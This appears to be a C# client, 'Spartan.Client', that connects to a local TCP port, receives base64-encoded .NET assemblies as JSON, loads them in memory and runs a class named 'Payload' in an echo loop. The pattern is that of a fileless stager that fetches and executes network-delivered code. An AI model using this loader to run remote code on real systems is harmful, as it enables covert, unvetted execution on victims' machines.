using System.Net.Sockets;
using System.Reflection;
using System.Runtime.Loader;
using System.Text;
using System.Text.Json;

namespace Spartan.Client;

class Program
{
    static void Main()
    {
        var tcpClient = new TcpClient("127.0.0.1", 12345);

        var networkStream = tcpClient.GetStream();

        var binaryReader = new BinaryReader(networkStream);
        var binaryWriter = new BinaryWriter(networkStream);

        var payloadLoadContext = new AssemblyLoadContext("");

        var payloadLength = binaryReader.ReadInt32();
        var payloadBytes = binaryReader.ReadBytes(payloadLength);

        var serializedPayload = Encoding.UTF8.GetString(payloadBytes);

        // deserialize the json
        var payload =
            JsonSerializer.Deserialize<Dictionary<string, string>>(serializedPayload);

        Assembly payloadAssembly = null;

        // Load dependencies into the load context
        foreach (var (assemblyName, assemblyBytes) in payload)
        {
            var dependencyStream = new MemoryStream(Convert.FromBase64String(assemblyBytes));
            var assembly = payloadLoadContext.LoadFromStream(dependencyStream);
            if (assemblyName == "Spartan.Payload")
            {
                payloadAssembly = assembly;
            }
        }

        // Instantiate and execute the payload
        var pluginType = payloadAssembly.GetType("Spartan.Payload.SocketClient");
        var pluginInstance = Activator.CreateInstance(pluginType, binaryReader, binaryWriter);
        dynamic plugin = Convert.ChangeType(pluginInstance, pluginType);
        
        while (true)
        {
            var data = Encoding.UTF8.GetString(plugin.ReceiveData());
            var response = $"You said: {data}";
            plugin.SendData(Encoding.UTF8.GetBytes(response));
        }
    }
}

// class PayloadLoadContext : AssemblyLoadContext
// {
//     protected override Assembly Load(AssemblyName assemblyName)
//     {
//         // Prevent default loading from disk
//         return null;
//     }
// }